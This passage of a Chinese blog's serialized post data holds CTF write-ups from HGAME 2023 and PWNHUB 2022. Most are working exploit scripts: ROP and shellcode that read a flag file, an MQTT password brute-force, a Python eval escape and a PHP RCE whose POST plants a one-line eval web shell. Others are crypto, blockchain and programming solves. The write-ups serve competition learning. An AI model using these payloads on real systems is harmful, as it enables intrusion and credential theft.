next(libc.search(asm(gadget),executable=True))bss_rop=0x404048bss_flag=0x404038leave_ret=0x4012EEr.recvline()r.recvline()pl=b&#x27;a&#x27;*(0x100)+p64(bss_rop)+p64(findGadget(&#x27;pop rsi;ret&#x27;))+p64(bss_rop)+p64(libc.sym.read)+p64(leave_ret)r.send(pl)pl=b&#x27;a&#x27;*8+p64(findGadget(&#x27;pop rsi;ret&#x27;))+p64(bss_flag)+p64(libc.sym.read)pl+=p64(pop_rdi)+p64(bss_flag)+p64(findGadget(&#x27;pop rsi;ret&#x27;))+p64(0)+p64(libc.sym.open) # fd=open(&#x27;./flag&#x27;,0) #3pl+=p64(pop_rdi)+p64(3)+p64(findGadget(&#x27;pop rsi;ret&#x27;))+p64(bss_rop)+p64(findGadget(&#x27;pop rdx;ret&#x27;))+p64(0x30)+p64(libc.sym.read) # read(3,buf,0x100)pl+=p64(pop_rdi)+p64(1)+p64(findGadget(&#x27;pop rsi;ret&#x27;))+p64(bss_rop)+p64(findGadget(&#x27;pop rdx;ret&#x27;))+p64(0x30)+p64(libc.sym.write) # puts(buf)r.send(pl)r.send(b&#x27;flag&#x27;)r.interactive() ​ simple_shellcode HINTS: 一次read不够多，为什么不再读一次呢？ 初看代码像ret2shellcode，但开启了沙盒禁用了 execve()/execveat()，而且 read() 只能读入0x10字节。 需要写入shellcode，但需先调用一次 read() 以读取更多的字节，再执行orw即可。 123456789101112131415161718192021222324from pwn import *r=remote(&#x27;week-1.hgame.lwsec.cn&#x27;,31331)context(arch=&#x27;amd64&#x27;)r.recvline()pl = asm(&#x27;&#x27;&#x27; xor rdi,rdi mov rsi,rdx mov rdx,0x100 syscall &#x27;&#x27;&#x27;)print(len(pl))r.send(pl)pl = shellcraft.open(&#x27;./flag&#x27;)pl += shellcraft.read(&#x27;rax&#x27;,&#x27;rsp&#x27;,0x100)pl += shellcraft.write(1,&#x27;rsp&#x27;,0x100)pl = asm(pl)print(len(pl))print(len(asm(shellcraft.read(&#x27;rax&#x27;,&#x27;rsp&#x27;,0x100))))r.send(&#x27;a&#x27;*0xf+pl)r.interactive() ​ BlockchainCheckin 题目中给出了三个端口，分别是 RPC、水龙头、题目交互端。 由于靶机端口随机，需要选手自行尝试。 其中，浏览器可直接访问的是水龙头，浏览器直接访问报 403 的是 RPC，浏览器无法访问的是题目交互端，需使用 nc 连接。 nc连接，选1生成账号，在水龙头里转账后，选2生成合约地址，选4查看源码： 12345678910111213141516171819202122232425// contracts/checkin.sol// SPDX-License-Identifier: MITpragma solidity 0.8.17;contract Checkin &#123; string greeting; constructor(string memory _greeting) &#123; greeting = _greeting; &#125; function greet() public view returns (string memory) &#123; return greeting; &#125; function setGreeting(string memory _greeting) public &#123; greeting = _greeting; &#125; function isSolved() public view returns (bool) &#123; string memory expected = &quot;HelloHGAME!&quot;; return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting)); &#125;&#125; 代码逻辑为通过 setGreeting() 传入字符串使得 isSolved() 返回 true，传入的字符串为 HelloHGAME! 即满足条件。 尝试在Remix中攻击已生成的合约地址没打通，问出题人知对Remix环境做了限制（防作弊），需采用web3py脚本方式进行攻击： 12345678910111213141516171819202122232425262728293031323334353637383940from web3 import Web3, HTTPProviderimport json# RPC网络环境rpc = &#x27;&#x27;w3 = Web3(HTTPProvider(rpc))# 检测连通性print(w3.isConnected())# Metamask地址myAccount = &#x27;&#x27;# 合约地址contractAddress = &#x27;&#x27;# Metamask私钥private_key = &#x27;&#x27;# abi在Remix上编译.sol源码后获取abi = json.loads(&#x27;[&#123;&quot;inputs&quot;: [&#123;&quot;internalType&quot;: &quot;string&quot;,&quot;name&quot;: &quot;_greeting&quot;,&quot;type&quot;: &quot;string&quot;&#125;],&quot;stateMutability&quot;: &quot;nonpayable&quot;,&quot;type&quot;: &quot;constructor&quot;&#125;,&#123;&quot;inputs&quot;: [],&quot;name&quot;: &quot;greet&quot;,&quot;outputs&quot;: [&#123;&quot;internalType&quot;: &quot;string&quot;,&quot;name&quot;: &quot;&quot;,&quot;type&quot;: &quot;string&quot;&#125;],&quot;stateMutability&quot;: &quot;view&quot;,&quot;type&quot;: &quot;function&quot;&#125;,&#123;&quot;inputs&quot;: [],&quot;name&quot;: &quot;isSolved&quot;,&quot;outputs&quot;: [&#123;&quot;internalType&quot;: &quot;bool&quot;,&quot;name&quot;: &quot;&quot;,&quot;type&quot;: &quot;bool&quot;&#125;],&quot;stateMutability&quot;: &quot;view&quot;,&quot;type&quot;: &quot;function&quot;&#125;,&#123;&quot;inputs&quot;: [&#123;&quot;internalType&quot;: &quot;string&quot;,&quot;name&quot;: &quot;_greeting&quot;,&quot;type&quot;: &quot;string&quot;&#125;],&quot;name&quot;: &quot;setGreeting&quot;,&quot;outputs&quot;: [],&quot;stateMutability&quot;: &quot;nonpayable&quot;,&quot;type&quot;: &quot;function&quot;&#125;]&#x27;)# 获取合约contract = w3.eth.contract(address=contractAddress, abi=abi)nonce = w3.eth.getTransactionCount(Web3.toChecksumAddress(myAccount))# 合约交易定义，调用函数setGreeting# 事先保证myAccount有足够ether支付gas*gasPrice+value，从水龙头获取ethertx = contract.functions.setGreeting(&#x27;HelloHGAME!&#x27;).buildTransaction(&#123; &#x27;from&#x27;: Web3.toChecksumAddress(myAccount), &#x27;gasPrice&#x27;: w3.eth.gasPrice, &#x27;nonce&#x27;: nonce, &#x27;value&#x27;: 0, &#125;)gas = w3.eth.estimate_gas(tx)tx[&#x27;gas&#x27;] = gasprint(tx)# 交易执行signed_txn = w3.eth.account.signTransaction(tx, private_key)print(signed_txn.hash)print(signed_txn.rawTransaction)tmp = w3.eth.sendRawTransaction(signed_txn.rawTransaction.hex()) 最后nc连接，选4获取flag。 ​ IotHelp marvin 兔兔发现售票的marvin只会吐出三个白头 决定去修一修marvin(-30) HINTS: Hint: SPI 给定的是sr文件，解压，根据文件内容搜索知为逻辑分析套件sigrok生成的文件。 使用PulseView工具打开sr文件，在D0/D1/D2有数据，参考 2022DASCTF X SU 三月春季挑战赛 What’s In The Bits 以及后放的提示，知符合SPI协议特征。 选择SPI解码器，clock选D0，输入选D2，导出所有解码的01字符： 00110100001100111011000010110110101100101011110110011010001011111001101010111010000110100011011100110011101100101010111110101001101110000001100010111110 去掉头位0，8位一组可还原字符串 hgame&#123;4_5t4nge_Sp1&gt;，修正最后一位补足一位1，得 hgame&#123;4_5t4nge_Sp1&#125;。 ​ Help the uncle who can’t jump twice 兔兔在车站门口看到一张塑料凳子,上边坐着一个自称V的男人.他希望你能帮他登上他的大号 Vergil 去那边的公告栏上康康Nero手上的YAMATO怎么样了 broker:117.50.177.240:1883 HINTS: Hint: mqtt 根据broker地址知使用的MQTT协议，参考 物联网安全实战从零开始-MQTT协议分析 安装mqtt-pwn。 使用命令爆破 Vergil 的密码，指定给定的密码本： bruteforce --host 117.50.177.240 --port 1883 -u Vergil -pf password.txt 得到结果： [+] Found valid credentials: Vergil:power 下载broker连接工具MQTT.fx，使用账密 Vergil/power 登录broker，在订阅处输入主题 Nero/YAMATO，收到包含flag的信息：hgame&#123;mqtt_1s_p0w3r&#125;。 ​","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2023赛","slug":"2023赛","permalink":"https://lazzzaro.github.io/tags/2023%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"PWNHUB2022冬季赛","slug":"match-PWNHUB2022冬季赛","date":"2022-12-18T15:20:03.000Z","updated":"2022-12-20T10:40:05.641Z","comments":true,"path":"2022/12/18/match-PWNHUB2022冬季赛/","permalink":"https://lazzzaro.github.io/2022/12/18/match-PWNHUB2022%E5%86%AC%E5%AD%A3%E8%B5%9B/","excerpt":"","text":"​ ✌️竞赛时间：12月17日 10:00—12月18日 22:00✌️得分规则：比赛采用动态分数制度 ，每道题目的分值将根据解出队伍的数量进行动态记分。✌️题目类型：Web、Pwn、Reverse、Misc、Crypto等 Rank: 9 misc坐井观天python逃逸，利用 eval(input()) 绕过关键字黑名单： 12eval(input())__import__(&quot;os&quot;).popen(&quot;env&quot;).read() ​ 证书里也有秘密xray证书信息解析，参考Github项目 xray-crack，将 main.go 编译： go build -o goxray main.go 再运行： ./goxray -p xray-license.lic 即可得到证书内容数据： 123version ok: 2license parsed: &#123;bc5d237dc9b7470e94b61687c19e62fc 3270cdada4eb4a809d25ff4820d5a1f7 王德发 COMMUNITY-ADVANCED 1320981071 1645539742&#125;crypto/rsa: verification error 故flag为user_id：flag&#123;3270cdada4eb4a809d25ff4820d5a1f7&#125;。 ​ crypto大杂烩 12345678910111213141516171819202122232425262728293031323334353637383940# sagefrom Crypto.Util.number import *from gmpy2 import *from random import *padding = lambda num, bit_len: (num &lt;&lt; (512 - bit_len)) + getrandbits(512 - bit_len)flag = b&#x27;**************************************&#x27;m1, m2 = bytes_to_long(flag[:19]), bytes_to_long(flag[19:])p = next_prime(padding(m1, m1.bit_length()))q = next_prime(padding(m2, m2.bit_length()))n = p * qe = getPrime(128)d = inverse(e, (p - 1) * (q-1))a, b = e &amp; 0x3ffffffffff, e &gt;&gt; 42N = getPrime(128)E = EllipticCurve(Zmod(N), [a, b])NN = getPrime(1024)S = inverse(getPrime(128), NN) * inverse(getPrime(128), NN)d1 = d &gt;&gt; 512d2 = d &amp; (1 &lt;&lt; 512) - 1enc1 = S * d1 % NNenc2 = S * d2 % NNprint(&#x27;n =&#x27;, n)print(&#x27;a =&#x27;, a)print(&#x27;N =&#x27;, N)print(&#x27;POINT =&#x27;, E.lift_x(996))print(&#x27;enc1 =&#x27;, enc1)print(&#x27;enc2 =&#x27;, enc2)print(&#x27;NN =&#x27;, NN)# n = 117749279680045360245987277946945707343578937283621512842997606104123872211782263906911929773756533011817679794905642225389185861207256322349591633257348367854563703050789889773031032949742664695416275919382068347995088593380486820784360816053546651916291080971628354468517506190756456913824397593128781030749# a = 1755716071599# N = 236038564943567983056828121309828109017# POINT = (996 : 151729833458737979764886336489671975339 : 1)# enc1 = 98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356# enc2 = 58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204# NN = 149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347 $a,b$ 分别为 $e$ 的低42位和高(128-42)位，有 $e=2^{42}b+a$。 $a$ 已知，根据点 $P=(P_x,P_y)$ 及椭圆曲线 $E$ 方程 $y^2 \\equiv x^3+ax+b \\pmod N$，代入求解 $b$。 同理，$d=2^{512}d_1+d_2$，因 $c_1 = Sd_1 \\bmod N’,c_2 = Sd_2 \\bmod N’$，分别使用类似Wiener Attack的格子求解 $d_1,d_2$。 最后已知 $e,d,n$，分解 $n$ 得 $p,q$，flag两部分分别在 $p,q$ 中。 12345678910111213141516171819202122232425262728293031323334353637383940414243import randomimport gmpy2def divide_pq(e, d, n): k = e*d - 1 while True: g = random.randint(2, n-1) t = k while True: if t % 2 != 0: break t //= 2 x = pow(g, t, n) if x &gt; 1 and gmpy2.gcd(x-1, n) &gt; 1: p = gmpy2.gcd(x-1, n) return (p, n//p)n = 117749279680045360245987277946945707343578937283621512842997606104123872211782263906911929773756533011817679794905642225389185861207256322349591633257348367854563703050789889773031032949742664695416275919382068347995088593380486820784360816053546651916291080971628354468517506190756456913824397593128781030749a = 1755716071599N = 236038564943567983056828121309828109017Px, Py = (996, 151729833458737979764886336489671975339)enc1 = 98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356enc2 = 58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204NN = 149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347F = Zmod(N)b = int(F(Py^2 - (Px^3 + a*Px)))e = 2^42 * b + aL1 = Matrix(ZZ, [[enc1, 2^256],[NN, 0]])d1 = -L1.LLL()[0][0]L2 = Matrix(ZZ, [[enc2, 2^256],[NN, 0]])d2 = -L2.LLL()[0][0]d = 2^512 * d1 + d2p, q = divide_pq(e, d, n)flag1 = bytes.fromhex(hex(p&gt;&gt;(512-19*8+2))[2:])flag2 = bytes.fromhex(hex(q&gt;&gt;(512-19*8+1))[2:])print(flag1)print(flag2)# b&#x27;4cb201080d8b240774&#125;&#x27;# b&#x27;flag&#123;e89f47939d1243&#x27; flag：flag&#123;e89f47939d12434cb201080d8b240774&#125;。 ​ pwnjustJSjs命令执行即可： eval(read(&quot;/flag&quot;)) 在 eval() 的报错文字中得到flag： 12345undefined:1: SyntanError: Unexpected token &#x27;&#123;&#x27;flag&#123;5cff08f23eb37451bd84effb99275794&#125; ^SyntanError: Unexpected token &#x27;&#123;&#x27; at input.js:1:6 ​ ppcTcp Show Description 众所周知，Wireshark 带有一个 follow tcp stream 功能，可以展示 TCP 流量的来回通信。 为了给某产品增加显示 TCP 来回流量的功能，你准备读取流量文件来生成类似的展示效果。 Input 第一行输入一个数字 N，表示接下来有 N 行。 接下来 N 行，每一行都由两部分组成。首先是一个数字 D，数字 D 为 0 表示为客户端发给服务器的方向，数字 D 为 1 表示服务器发给客户端方向；然后第二部分是一个 base64 字符串，表示编码后的流量具体内容。 Output 对于每一行的流量包，生成类似 wireshark 的 hexdump 模式的流量展示。其中： 每行开头都是 8 位 hex，表示当前这一行在该流量包的偏移。 两个空格之后，是该流量包的 hex dump 内容，每行 16 个 hex dump。 hex dump 之后，是该流量包内容的字符显示，对于可见字符(32 ~ 126)，显示字符本身，对于不可见字符，显示一个 . 号 对于无法凑齐 16 个 hex 的行，其不足的内容用空格代替。确保每一行的总长度是相等的。 根据下面的样例，仔细处理空格的数量。 按照输出要求格式化解析即可： 1234567891011121314151617181920212223242526from base64 import b64decodefrom math import ceilN = int(input())for c in range(N): k, b = input().split(&#x27; &#x27;) h = list(b64decode(b.encode())) if k == &#x27;0&#x27;: for i in range(ceil(len(h)/16)): ind = hex(i*16)[2:].rjust(8,&#x27;0&#x27;) hh = h[16*i:16*(i+1)] hh1 = &#x27; &#x27;.join([hex(j)[2:].rjust(2,&#x27;0&#x27;) for j in hh[:8]] + [&#x27; &#x27;]*(8-len(hh[:8]))) hh2 = &#x27; &#x27;.join([hex(j)[2:].rjust(2,&#x27;0&#x27;) for j in hh[8:]] + [&#x27; &#x27;]*(8-len(hh[8:]))) ch1 = &#x27;&#x27;.join([chr(j) if j in range(32,127) else &#x27;.&#x27; for j in hh[:8]]).ljust(8,&#x27; &#x27;) ch2 = &#x27;&#x27;.join([chr(j) if j in range(32,127) else &#x27;.&#x27; for j in hh[8:]]).ljust(8,&#x27; &#x27;) print(f&#x27;&#123;ind&#125; &#123;hh1&#125; &#123;hh2&#125; &#123;ch1&#125; &#123;ch2&#125;&#x27;) else: for i in range(ceil(len(h)/16)): ind = hex(i*16)[2:].rjust(8,&#x27;0&#x27;) hh = h[16*i:16*(i+1)] hh1 = &#x27; &#x27;.join([hex(j)[2:].rjust(2,&#x27;0&#x27;) for j in hh[:8]] + [&#x27; &#x27;]*(8-len(hh[:8]))) hh2 = &#x27; &#x27;.join([hex(j)[2:].rjust(2,&#x27;0&#x27;) for j in hh[8:]] + [&#x27; &#x27;]*(8-len(hh[8:]))) ch1 = &#x27;&#x27;.join([chr(j) if j in range(32,127) else &#x27;.&#x27; for j in hh[:8]]).ljust(8,&#x27; &#x27;) ch2 = &#x27;&#x27;.join([chr(j) if j in range(32,127) else &#x27;.&#x27; for j in hh[8:]]).ljust(8,&#x27; &#x27;) print(f&#x27; &#123;ind&#125; &#123;hh1&#125; &#123;hh2&#125; &#123;ch1&#125; &#123;ch2&#125;&#x27;) ​ Fight Clones Description Neo 被 Smith 的分身们包围了！他需要击败他们！ 每一个 Smith 都有自己的攻击值和生命值。在受到攻击之前，他们都可以持续攻击 Neo。 Neo 也有自己的攻击值和生命值，虽然比 Smith 高得多，但是 Neo 一次也只能攻击一个 Smith（是的他没有 AOE）。 Neo 需要找到一个最优的攻击策略，以保证自己生命值被减为零之前击倒所有 Smith。 Neo 的生命值是确定的，Oracle 之前告诉过他。但是他需要知道自己的攻击值是否能够确保打赢 Smith 们。 你能帮 Neo 计算出他所需要的最小攻击值么？ Input 第一行输入两个整数 $N H$ ($1 \\le N \\le 1000,1 \\le H \\le 1000000$)，表示总共有 $N$ 个 Smith，以及 Neo 的生命值为 $H$。 接下来 $N$ 行，表示 $N$ 个 Smith 的属性，每行格式为 $AH$，其中 - $A$ 为该 Smith 的攻击值 ($1 \\le A \\le 1000$)。 - $H$ 为该 Smith 的生命值 ($1 \\le H \\le 1000$)。 Output 输出一个整数，表示所需要的最小攻击值。如果无法保证击败 Smith 们则输出 -1。 Hint Neo 和 Smith 们是 实时战斗制（非回合制），即 Neo 和 Smith 们可以同时攻击对方，只不过 Neo 一个时间只能打一个 Smith， 而 Smith 们可以群殴 Neo（不用考虑碰撞体积的问题）。 可以假定 Neo 和 Smith 们每单位时间只能击打对手一次。例如，某个 Smith 生命值为 20，而 Neo 攻击值为 15，那 Neo 也需要消耗 两个单位的时间来消灭该 Smith，同时意味着有 10 单位的攻击力被浪费掉了。 Smith 一旦受到 Neo 的攻击，就会停止击打 Neo。例如 Neo 和 Smith 某一个时刻同时攻击对方，Neo 则不会受到伤害。 贪心算法+二分查找最小攻击值。 12345678910111213141516171819202122232425262728293031from functools import cmp_to_keydef custom_sort(x, y): return y[0] * x[2] - x[0] * y[2]def find_min_attack(neo_life, smiths): l = 1 r = 1000 ans = -1 while l &lt;= r: m = (l + r) // 2 s = [(k[0], k[1], (k[1]+m-1)//m) for k in smiths] s.sort(key=cmp_to_key(custom_sort)) res = 0 t = 0 for i in range(len(s)): res += t*s[i][0] t += s[i][2] if res &lt; neo_life: ans = m r = m - 1 else: l = m + 1 return ansN, H = list(map(int,input().split()))smiths = []for i in range(N): smiths.append(tuple(map(int,input().split()))) print(find_min_attack(H, smiths)) ​ gaming游戏来咯登录游戏就在公告栏看到flag：flag&#123;churusanguo&#125;。 ​ 攻城拔寨达到一定等级后游戏内会收到邮件，按 getshell 一题拿到权限后，找到 D:/APMServ5.2.6/www/htdocs/server/config/db.php，得到mysql数据库账号密码： 1234567define(&#x27;db_persistent&#x27;,1);define(&#x27;db_RDBMS&#x27;, &#x27;mysql&#x27;);define(&#x27;db_Username&#x27;, &#x27;sgphp1g2ame&#x27;);define(&#x27;db_Password&#x27;, &#x27;@Qwer123456&#x27;);define(&#x27;db_Server&#x27;, &#x27;127.0.0.1&#x27;);define(&#x27;db_Port&#x27;, &#x27;3306&#x27;);define(&#x27;db_Database&#x27;, &#x27;bloodwar&#x27;); 在蚁剑用mysql连接，账号 sgphp1g2ame，密码 @Qwer123456，在表 sys_mail_sys_content 中找到邮件内容：恭喜恭喜, flag2 flag&#123;jiaguanjinjueN&#125;。 ​ 特殊玩家有玩家的名字是flag，按 getshell 一题拿到权限后，源码自带修改器，打开前修改配置文件 config.ini： 123456789[config]IP=120.55.42.64数据库=bloodwar账号=sgphp1g2ame密码=@Qwer123456端口=3306路径=D:\\APMServ5.2.6\\www\\htdocs\\images\\armor聊天端口=5308登录信息= 打开修改器，在用户基本信息发现用户名 flag&#123;mysqlwo&#125;。 ​ getshell在源码 APMServ5.2.6/www/htdocs/server/game/BattleNetGateway.php 中发现容易控制传值的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php require_once(&quot;interface.php&quot;); require_once(&quot;utils.php&quot;); require_once(&quot;BattleFunc.php&quot;); require_once(&quot;HeroFunc.php&quot;); require_once(&quot;BattleNetServices.php&quot;); define(&quot;BATTLE_NET_KEY&quot;,&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;); if (!defined(&#x27;PATH_SEPARATOR&#x27;)) &#123;if (substr(PHP_OS, 0, 3) == &#x27;WIN&#x27;) define(&#x27;PATH_SEPARATOR&#x27;, &#x27;;&#x27;); else define(&#x27;PATH_SEPARATOR&#x27;, &#x27;:&#x27;);&#125; ini_set(&#x27;include_path&#x27;,ini_get(&#x27;include_path&#x27;).PATH_SEPARATOR.realpath(&quot;../&quot;)); $param=$_POST; if(empty($param))$param=$_GET; $from_uid=$param[&quot;from_uid&quot;]; $sign=$param[&quot;sign&quot;]; $commandFunc=$param[&quot;commandFunc&quot;]; $content=urldecode($param[&quot;content&quot;]); $content_encoding=$param[&quot;content-encoding&quot;]; //$tt=$from_uid.$commandFunc.$content.BATTLE_NET_KEY; $ret=array(); if($sign!=md5($from_uid.$commandFunc.$content.BATTLE_NET_KEY)) //sign为传入值与key连接字符串的md5值 $ret[]=0; else&#123; $ret[]=1; try&#123; if($content_encoding==&quot;csv&quot;)&#123; $inputParams=explode(&quot;|&quot;,$content); //按|分割content传入内容 if(count($inputParams)==1)&#123; $inputParams=$inputParams[0]; &#125; $ret[]=$commandFunc($from_uid,$inputParams); //RCE漏洞 &#125;else&#123; $inputParams=json_decode($content,true); if(is_array($inputParams)&amp;&amp;count($inputParams)==1)&#123; $inputParams=array_shift($inputParams); &#125; $ret[]=$commandFunc($from_uid,$inputParams); &#125; &#125;catch(Exception $e)&#123; $ret = array(0=&gt;0); $ret[] = $e-&gt;getMessage(); &#125; &#125; if($content_encoding==&quot;csv&quot;)&#123; print implode(&quot;|&quot;,$ret); &#125;else&#123; print json_encode($ret); &#125; ?&gt; 此处可以RCE，分析代码逻辑，利用 file_put_contents 写入一句话木马： POST: from_uid=xx.php&amp;commandFunc=file_put_contents&amp;content=&lt;%3fphp%20%40eval($_POST[xxx])%3b&amp;content-encoding=csv&amp;sign=734c00692057aaf9f6c763f405cbec6b 蚁剑连接，在D:目录下找到 flag.txt，flag：flag&#123;breakItAndOutIt&#125;。 ​ other文字频率分析非预期解法，将1000×1000图片分割为400张50×50的图片： 1234567891011from PIL import Imagefrom hashlib import md5im = Image.open(&#x27;word.png&#x27;)c = 0for i in range(20): for j in range(20): box = (50*i,50*j,50*(i+1),50*(j+1)) region = im.crop(box) region.save(f&#x27;img/&#123;c&#125;.png&#x27;) c += 1 测试发现相同字母的图片，其文件md5值相同，利用此规律统计字频，先操作一次找出26个字母对应文件的md5值： 1234567891011121314151617181920from hashlib import md5from collections import Countersample = [7,38,28,0,73,13,42,18,36,102,12,3,2,19, 9,58,20,1,5,30,50,24,11,22,8,66]m = []for i in range(400): path = fr&#x27;C:\\Users\\admin\\Desktop\\img\\&#123;i&#125;.png&#x27; m.append(md5(open(path,&#x27;rb&#x27;).read()).hexdigest())res = Counter(m)print(res)print(len(res))alp_md5 = [m[sample[i]] for i in range(26)]print(alp_md5)# 得到md5对应list# [&#x27;d108ad1582e37a825d092131a55babcc&#x27;, &#x27;9901603c7d2a5dde25723c9e569428da&#x27;, &#x27;5e47df30ddf5e623c9bbcd4fde58ec88&#x27;, &#x27;5bf0c7d972b37455dc32777ffdad86b9&#x27;, &#x27;33ff92480ee08585d901ffd0a47de021&#x27;, &#x27;3d3f026d8fc719c35a917d98d9b7474b&#x27;, &#x27;c07bd9475b8e9d65334e2f24f19794b3&#x27;, &#x27;4497c04cea4897727d88f7945bc86d77&#x27;, &#x27;047fd19a9a30301444e11394ee99d8be&#x27;, &#x27;802d7d3a2c02a1b6ba5f0860b70b54df&#x27;, &#x27;52d9844a5ed4eee07af4f48f880e3d5b&#x27;, &#x27;109d33cf832c83ebebca8c4f165862a9&#x27;, &#x27;f5252d81a8afc71cf5dd29270a398beb&#x27;, &#x27;121808a4d3f160f235f27cb77355d525&#x27;, &#x27;b15356da578f67bac5a3d777913ce97d&#x27;, &#x27;a174639d2070109e85ffb53657d5c9d5&#x27;, &#x27;e30a3ca0d2f0326a10175e8d6ed8a178&#x27;, &#x27;a267e80b28a9dae7e2c5d70198e808d7&#x27;, &#x27;e1e4b54464f7ae41ba2c71a9244d7347&#x27;, &#x27;ccf09a4c80cc7e4b3134ea53f423ec38&#x27;, &#x27;5b5480bc64f225e422ed8f084e629ff8&#x27;, &#x27;f17c5f58bf983a684cc8d7d4b3c1ae0b&#x27;, &#x27;287d3dac4e058281282e0eee00d9ddd4&#x27;, &#x27;a782a16d1fca70e6217e45dd3fe8ae6e&#x27;, &#x27;18cad01f22ca7c4bc9a7536474d17273&#x27;, &#x27;a4e1c4687c9c785271fc24f79aa2e0f0&#x27;] 再综合起来解题： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import *from hashlib import md5from pwnlib.util.iters import mbruteforcefrom base64 import b64decodefrom PIL import Imagefrom collections import Counterr = remote(&quot;47.97.127.1&quot;,20382)table = &#x27;0123456789abcdef&#x27;def pow(): r.recvuntil(&quot;plaintext: &quot;) suffix = r.recv(26).decode(&quot;utf8&quot;) r.recvuntil(&quot;md5_hex -&gt; &quot;) cipher = r.recvline().strip().decode(&quot;utf8&quot;) proof = mbruteforce(lambda x: md5((suffix+x).encode()).hexdigest() == cipher, table, length=6, method=&#x27;fixed&#x27;) r.sendlineafter(&#x27;&gt; &#x27;, suffix+proof) pow()r.recvline()open(&#x27;word.png&#x27;,&#x27;wb&#x27;).write(b64decode(r.recvline().strip()))im = Image.open(&#x27;word.png&#x27;)c = 0for i in range(20): for j in range(20): box = (50*i,50*j,50*(i+1),50*(j+1)) region = im.crop(box) region.save(&#x27;img/&#123;&#125;.png&#x27;.format(c)) c += 1 sample = [&#x27;d108ad1582e37a825d092131a55babcc&#x27;, &#x27;9901603c7d2a5dde25723c9e569428da&#x27;, &#x27;5e47df30ddf5e623c9bbcd4fde58ec88&#x27;, &#x27;5bf0c7d972b37455dc32777ffdad86b9&#x27;, &#x27;33ff92480ee08585d901ffd0a47de021&#x27;, &#x27;3d3f026d8fc719c35a917d98d9b7474b&#x27;, &#x27;c07bd9475b8e9d65334e2f24f19794b3&#x27;, &#x27;4497c04cea4897727d88f7945bc86d77&#x27;, &#x27;047fd19a9a30301444e11394ee99d8be&#x27;, &#x27;802d7d3a2c02a1b6ba5f0860b70b54df&#x27;, &#x27;52d9844a5ed4eee07af4f48f880e3d5b&#x27;, &#x27;109d33cf832c83ebebca8c4f165862a9&#x27;, &#x27;f5252d81a8afc71cf5dd29270a398beb&#x27;, &#x27;121808a4d3f160f235f27cb77355d525&#x27;, &#x27;b15356da578f67bac5a3d777913ce97d&#x27;, &#x27;a174639d2070109e85ffb53657d5c9d5&#x27;, &#x27;e30a3ca0d2f0326a10175e8d6ed8a178&#x27;, &#x27;a267e80b28a9dae7e2c5d70198e808d7&#x27;, &#x27;e1e4b54464f7ae41ba2c71a9244d7347&#x27;, &#x27;ccf09a4c80cc7e4b3134ea53f423ec38&#x27;, &#x27;5b5480bc64f225e422ed8f084e629ff8&#x27;, &#x27;f17c5f58bf983a684cc8d7d4b3c1ae0b&#x27;, &#x27;287d3dac4e058281282e0eee00d9ddd4&#x27;, &#x27;a782a16d1fca70e6217e45dd3fe8ae6e&#x27;, &#x27;18cad01f22ca7c4bc9a7536474d17273&#x27;, &#x27;a4e1c4687c9c785271fc24f79aa2e0f0&#x27;]m = []for i in range(400): path = &#x27;img/&#123;&#125;.png&#x27;.format(i) x = md5(open(path,&#x27;rb&#x27;).read()).hexdigest() m.append(x)res = Counter(m)print(res)print(len(res))out = []for i in range(26): out.append(res[sample[i]])print(out)r.recvuntil(&#x27;&gt; &#x27;)r.sendline(str(out).replace(&#x27; &#x27;,&#x27;&#x27;).strip(&#x27;[&#x27;).strip(&#x27;]&#x27;))r.interactive() 得到结果： 12Got it!flag&#123;d8b8a96466e21df8b45cce5ce875e95e&#125; ​ 图片识别给定动物样本数据，判断随机抽取10次动物图片，输入动物名称，正确至少8次给flag，每次3s内输入。 数量较少，非预期直接按照图片手动判断在3s内快速输入即可。 半自动交互： 1234567891011121314151617181920212223242526272829303132from pwn import *from hashlib import md5from pwnlib.util.iters import mbruteforcefrom base64 import b64decodefrom PIL import Imager = remote(&quot;47.97.127.1&quot;,28452)table = &#x27;0123456789abcdef&#x27;def pow(): r.recvuntil(&quot;plaintext: &quot;) suffix = r.recv(26).decode(&quot;utf8&quot;) r.recvuntil(&quot;md5_hex -&gt; &quot;) cipher = r.recvline().strip().decode(&quot;utf8&quot;) proof = mbruteforce(lambda x: md5((suffix+x).encode()).hexdigest() == cipher, table, length=6, method=&#x27;fixed&#x27;) r.sendlineafter(&#x27;&gt; &#x27;, suffix+proof) pow()r.recvline()r.recvline()for i in range(10): open(&#x27;animal.png&#x27;,&#x27;wb&#x27;).write(b64decode(r.recvline().strip())) img = Image.open(&#x27;animal.png&#x27;) img.show() r.recvuntil(&#x27;&gt; &#x27;) r.sendline(raw_input(&#x27;&gt; &#x27;)) print(r.recvline())r.interactive() ​ 垃圾邮件分析提供50封邮件内容的正常邮件/垃圾邮件分类，判断10封邮件内容属于哪种分类，全对给flag。 数量较少，非预期直接按照内容手动判断即可。 PoW部分： 12345678910111213141516171819202122232425from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforcer = remote(&quot;47.97.127.1&quot;,27218)table = string.ascii_letters+string.digitsdef pow(): r.recvuntil(&quot;sha256(&quot;) suffix = 